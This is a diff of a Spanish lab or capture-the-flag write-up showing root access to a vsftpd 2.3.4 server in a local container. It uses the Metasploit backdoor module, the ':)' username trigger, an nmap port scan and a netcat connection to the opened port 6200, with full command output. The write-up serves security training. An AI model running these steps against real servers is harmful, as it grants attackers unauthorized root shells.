@@ -93,10 +93,9 @@ Al igual que antes, para que la visualización de toda la información sea más 
 ```
 
 Podemos observar que esta versión del servicio FTP ya la habiamos visto anteriormente y, sabemos que presenta una vulnerabilidad explotable de dos formas.
+### 1. USANDO METASPLOIT FRAMEWORK
 
-Usando [Metasploit Framework](https://github.com/rapid7/metasploit-framework) para su explotación.
-
-Yo decidí utilizar [metasploit](https://github.com/rapid7/metasploit-framework) en este caso añadiendo el parámetro -q para evitar el banner de inicio de la herramienta y así ganar más tiempo.
+Abrimos [Metasploit](https://github.com/rapid7/metasploit-framework) en este caso añadiendo el parámetro -q para evitar el banner de inicio de la herramienta y así ganar más tiempo.
 ```ruby
 ❯ msfconsole -q
 msf > search vsftpd 2.3.4
@@ -136,70 +135,68 @@ Exploit target:
 
 View the full module info with the info, or info -d command.
 
-msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 172.17.0.2
-RHOST => 172.17.0.2
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.17.0.2
+RHOSTS => 172.17.0.2
 msf exploit(unix/ftp/vsftpd_234_backdoor) > run
 [*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
 [*] 172.17.0.2:21 - USER: 331 Please specify the password.
 [+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
 [+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
 [*] Found shell.
-[*] Command shell session 1 opened (172.17.0.1:33483 -> 172.17.0.2:6200) at 2025-09-11 11:34:10 +0200
+[*] Command shell session 1 opened (172.17.0.1:41539 -> 172.17.0.2:6200) at 2025-09-16 12:16:53 +0200
 
 whoami
 root
 pwd
-/root/vsftpd-2.3.4
+/tmp/vsftpd-2.3.4-infected
 ```
 🥳CONSEGUIDO, SOMOS ROOT🥳
 ____________________________________________________________________________________________
- Otra opción hubiera sido ver la documentación acerca de esta vulnerabilidad.  Cuando la estudiamos de cerca vemos que hay una opción que, añadiendo ":)" al nombre de usuario se abre el puerto 6200 y con la herramienta [Netcat](https://github.com/tlmader/netcat) apuntando hacia ese puerto se nos devuleve una terminal.
+### 2. BACKDOOR POR EL PUERTO 6200
+Otra opción hubiera sido ver la documentación acerca de esta vulnerabilidad.  Cuando la estudiamos de cerca vemos que hay una opción que, añadiendo ":)" al nombre de usuario se abre el puerto 6200 y con la herramienta [Netcat](https://github.com/tlmader/netcat) apuntando hacia ese puerto se nos devuleve una terminal.
 ```ruby
 ❯ ftp 172.17.0.2
 Connected to 172.17.0.2.
 220 (vsFTPd 2.3.4)
-Name (172.17.0.2:kali): yo:)         
+Name (172.17.0.2:kali): hola:)
 331 Please specify the password.
 Password: 
 ^C
 421 Service not available, user interrupt. Connection closed.
 ftp: Login failed
 ftp> exit
-❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
+❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 12:03 CEST
-Initiating ARP Ping Scan at 12:03
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 12:20 CEST
+Initiating ARP Ping Scan at 12:20
 Scanning 172.17.0.2 [1 port]
-Completed ARP Ping Scan at 12:03, 0.06s elapsed (1 total hosts)
-Initiating SYN Stealth Scan at 12:03
+Completed ARP Ping Scan at 12:20, 0.10s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 12:20
 Scanning 172.17.0.2 [65535 ports]
+Discovered open port 80/tcp on 172.17.0.2
 Discovered open port 21/tcp on 172.17.0.2
 Discovered open port 6200/tcp on 172.17.0.2
-Completed SYN Stealth Scan at 12:03, 0.90s elapsed (65535 total ports)
+Completed SYN Stealth Scan at 12:20, 0.58s elapsed (65535 total ports)
 Nmap scan report for 172.17.0.2
-Host is up, received arp-response (0.11s latency).
-Scanned at 2025-09-11 12:03:58 CEST for 1s
-Not shown: 65533 closed tcp ports (reset)
+Host is up, received arp-response (0.49s latency).
+Scanned at 2025-09-16 12:20:26 CEST for 0s
+Not shown: 65532 closed tcp ports (reset)
 PORT     STATE SERVICE REASON
 21/tcp   open  ftp     syn-ack ttl 64
+80/tcp   open  http    syn-ack ttl 64
 6200/tcp open  lm-x    syn-ack ttl 64
 MAC Address: 02:42:AC:11:00:02 (Unknown)
 
 Read data files from: /usr/share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds
+Nmap done: 1 IP address (1 host up) scanned in 2.03 seconds
            Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
 ```
 ```ruby
 ❯ nc 172.17.0.2 6200
 pwd
-/root/vsftpd-2.3.4
+/tmp/vsftpd-2.3.4-infected
 whoami
 root
 ```
-
-🥳CONSEGUIDO, SOMOS ROOT🥳
-
-
-
 
 🥳CONSEGUIDO, SOMOS ROOT🥳
